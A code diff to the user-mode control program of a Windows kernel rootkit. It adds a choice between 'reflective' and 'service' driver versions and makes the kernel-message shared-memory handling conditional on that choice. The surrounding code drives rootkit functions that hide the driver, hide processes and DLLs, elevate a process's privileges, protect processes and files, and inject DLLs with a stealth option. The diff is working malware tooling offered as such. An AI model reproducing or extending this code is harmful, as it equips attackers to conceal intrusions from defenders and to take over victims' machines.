@@ -441,6 +441,23 @@ void showMenu() {
 
 int main() {
     std::cout << "Starting user mode program...\n";
+    bool service = false;
+    std::cout << "Have you started the reflective or service version of the driver?\n\n";
+    std::cout << "1. Reflective Version (RootkitReflective.sys)\n";
+    std::cout << "2. Service Version (RootkitService.sys)\n";
+    int c = -1;
+    std::cin >> c;
+    switch (c) {
+    case 1:
+        service = false;
+        break;
+    case 2:
+        service = true;
+        break;
+    default:
+        std::cout << "Invalid Choice...\n";
+        return 1;
+    }
 
     // Request more comprehensive access rights
     const HANDLE driver_handle = CreateFile(
@@ -471,22 +488,32 @@ int main() {
 
     std::cout << "Got a driver handle!\n";
 
-    HANDLE hSection = OpenFileMapping(FILE_MAP_READ, FALSE, L"Global\\MySharedSection");
-    if (!hSection) {
-        printf("[-] Failed to open shared memory: %lu\n", GetLastError());
-        return 1;
+    HANDLE hSection = NULL;
+    LPVOID pView = NULL;
+    HANDLE hEvent = NULL;
+
+    if (service) {
+        hSection = OpenFileMapping(FILE_MAP_READ, FALSE, L"Global\\MySharedSection");
+        if (!hSection) {
+            printf("[-] Failed to open shared memory: %lu\n", GetLastError());
+            return 1;
+        }
     }
 
-    LPVOID pView = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
-    if (!pView) {
-        printf("[-] Failed to map view: %lu\n", GetLastError());
-        return 1;
+    if (service) {
+        pView = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
+        if (!pView) {
+            printf("[-] Failed to map view: %lu\n", GetLastError());
+            return 1;
+        }
     }
 
-    HANDLE hEvent = OpenEvent(SYNCHRONIZE, FALSE, L"Global\\MySharedEvent");
-    if (!hEvent) {
-        printf("[-] Failed to open event: %lu\n", GetLastError());
-        return 1;
+    if (service) {
+        hEvent = OpenEvent(SYNCHRONIZE, FALSE, L"Global\\MySharedEvent");
+        if (!hEvent) {
+            printf("[-] Failed to open event: %lu\n", GetLastError());
+            return 1;
+        }
     }
     // Move all variable declarations here before the switch
     int choice;
@@ -510,14 +537,16 @@ int main() {
         case 1: {
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideTheDriver(driver_handle);
-            std::cout << "[+] Waiting for message from kernel...\n";
-            WaitForSingleObject(hEvent, 10000);
-            if (pView && ((char*)pView)[0] != '\0') {
-                printf("[+] Message From Kernel: %s\n", (char*)pView);
-                g_MsgFromKernel = std::string((char*)pView);
-            }
-            else {
-                printf("No message has been received from the kernel...\n");
+            if (service) {
+                std::cout << "[+] Waiting for message from kernel...\n";
+                WaitForSingleObject(hEvent, 10000);
+                if (pView && ((char*)pView)[0] != '\0') {
+                    printf("[+] Message From Kernel: %s\n", (char*)pView);
+                    g_MsgFromKernel = std::string((char*)pView);
+                }
+                else {
+                    printf("No message has been received from the kernel...\n");
+                }
             }
             Sleep(5000);
             system("cls");
@@ -528,14 +557,16 @@ int main() {
             std::cin >> pid;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::ElevateProcess(driver_handle, pid);
-            std::cout << "[+] Waiting for message from kernel...\n";
-            WaitForSingleObject(hEvent, 10000);
-            if (pView && ((char*)pView)[0] != '\0') {
-                printf("[+] Message From Kernel: %s\n", (char*)pView);
-                g_MsgFromKernel = std::string((char*)pView);
-            }
-            else {
-                printf("No message has been received from the kernel...\n");
+            if (service) {
+                std::cout << "[+] Waiting for message from kernel...\n";
+                WaitForSingleObject(hEvent, 10000);
+                if (pView && ((char*)pView)[0] != '\0') {
+                    printf("[+] Message From Kernel: %s\n", (char*)pView);
+                    g_MsgFromKernel = std::string((char*)pView);
+                }
+                else {
+                    printf("No message has been received from the kernel...\n");
+                }
             }
             Sleep(5000);
             system("cls");
@@ -546,14 +577,16 @@ int main() {
             std::cin >> pidHide;
             std::cout << "[!] Sending Message to Driver.\n";
             Rootkit::HideProcess(driver_handle, pidHide);
-            std::cout << "[+] Waiting for message from kernel...\n";
-            WaitForSingleObject(hEvent, 10000);
-            if (pView && ((char*)pView)[0] != '\0') {
-                printf("[+] Message From Kernel: %s\n", (char*)pView);
-                g_MsgFromKernel = std::string((char*)pView);
-            }
-            else {
-                printf("No message has been received from the kernel...\n");
+            if (service) {
+                std::cout << "[+] Waiting for message from kernel...\n";
+                WaitForSingleObject(hEvent, 10000);
+                if (pView && ((char*)pView)[0] != '\0') {
+                    printf("[+] Message From Kernel: %s\n", (char*)pView);
+                    g_MsgFromKernel = std::string((char*)pView);
+                }
+                else {
+                    printf("No message has been received from the kernel...\n");
+                }
             }
             Sleep(5000);
             system("cls");
@@ -582,14 +615,16 @@ int main() {
                     std::cin >> pidProtect;
                     std::cout << "[!] Sending Message to Driver.\n";
                     Rootkit::ProtectProcess(driver_handle, pidProtect);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    }
-                    else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -598,14 +633,16 @@ int main() {
                     std::cin >> pidProtect;
                     std::cout << "[!] Sending Message to Driver.\n";
                     Rootkit::UnProtectProcess(driver_handle, pidProtect);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    }
-                    else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -614,14 +651,16 @@ int main() {
                     std::cin >> pidProtect;
                     std::cout << "[!] Sending Message to Driver.\n";
                     Rootkit::ProtectProcessOP(driver_handle, pidProtect);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);;
-                    }
-                    else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -630,14 +669,16 @@ int main() {
                     std::cin >> pidProtect;
                     std::cout << "[!] Sending Message to Driver.\n";
                     Rootkit::UnProtectProcessOP(driver_handle, pidProtect);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    }
-                    else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -674,14 +715,16 @@ int main() {
             wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
             std::wcout << L"[!] Sending Message to Driver.\n";
             Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
-            std::cout << "[+] Waiting for message from kernel...\n";
-            WaitForSingleObject(hEvent, 10000);
-            if (pView && ((char*)pView)[0] != '\0') {
-                printf("[+] Message From Kernel: %s\n", (char*)pView);
-                g_MsgFromKernel = std::string((char*)pView);
-            }
-            else {
-                printf("No message has been received from the kernel...\n");
+            if (service) {
+                std::cout << "[+] Waiting for message from kernel...\n";
+                WaitForSingleObject(hEvent, 10000);
+                if (pView && ((char*)pView)[0] != '\0') {
+                    printf("[+] Message From Kernel: %s\n", (char*)pView);
+                    g_MsgFromKernel = std::string((char*)pView);
+                }
+                else {
+                    printf("No message has been received from the kernel...\n");
+                }
             }
             Sleep(5000);
             system("cls");
@@ -708,13 +751,16 @@ int main() {
                     std::wcin.getline(FilePath, MAX_PATH);
                     std::wcout << L"[!] Sending Message to Driver.\n";
                     Rootkit::ProtectFile(driver_handle, FilePath);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    } else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -724,13 +770,16 @@ int main() {
                     std::wcin.getline(FilePath, MAX_PATH);
                     std::wcout << L"[!] Sending Message to Driver.\n";
                     Rootkit::UnProtectFile(driver_handle, FilePath);
-                    std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    } else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -738,12 +787,16 @@ int main() {
                     std::cout << "[!] Sending request to clear all file protections.\n";
                     Rootkit::ClearFileProtections(driver_handle);
                     std::cout << "[+] Waiting for message from kernel...\n";
-                    WaitForSingleObject(hEvent, 10000);
-                    if (pView && ((char*)pView)[0] != '\0') {
-                        printf("[+] Message From Kernel: %s\n", (char*)pView);
-                        g_MsgFromKernel = std::string((char*)pView);
-                    } else {
-                        printf("No message has been received from the kernel...\n");
+                    if (service) {
+                        std::cout << "[+] Waiting for message from kernel...\n";
+                        WaitForSingleObject(hEvent, 10000);
+                        if (pView && ((char*)pView)[0] != '\0') {
+                            printf("[+] Message From Kernel: %s\n", (char*)pView);
+                            g_MsgFromKernel = std::string((char*)pView);
+                        }
+                        else {
+                            printf("No message has been received from the kernel...\n");
+                        }
                     }
                     Sleep(5000);
                     break;
@@ -780,14 +833,16 @@ int main() {
             bool stealth = AskForStealth();
             std::wcout << L"[!] Sending Message to Driver.\n";
             Rootkit::InjectDLL(driver_handle, FilePath, pid, stealth);
-            std::cout << "[+] Waiting for message from kernel...\n";
-            WaitForSingleObject(hEvent, 10000);
-            if (pView && ((char*)pView)[0] != '\0') {
-                printf("[+] Message From Kernel: %s\n", (char*)pView);
-                g_MsgFromKernel = std::string((char*)pView);
-            }
-            else {
-                printf("No message has been received from the kernel...\n");
+            if (service) {
+                std::cout << "[+] Waiting for message from kernel...\n";
+                WaitForSingleObject(hEvent, 10000);
+                if (pView && ((char*)pView)[0] != '\0') {
+                    printf("[+] Message From Kernel: %s\n", (char*)pView);
+                    g_MsgFromKernel = std::string((char*)pView);
+                }
+                else {
+                    printf("No message has been received from the kernel...\n");
+                }
             }
             Sleep(5000);
             break;
@@ -831,9 +886,11 @@ int main() {
         case 99: {
             std::cout << "Exiting the program, bye!\n";
             CloseHandle(driver_handle);
-            UnmapViewOfFile(pView);
-            CloseHandle(hSection);
-            CloseHandle(hEvent);
+            if (service) {
+                UnmapViewOfFile(pView);
+                CloseHandle(hSection);
+                CloseHandle(hEvent);
+            }
             return 0;
         }
         default: {
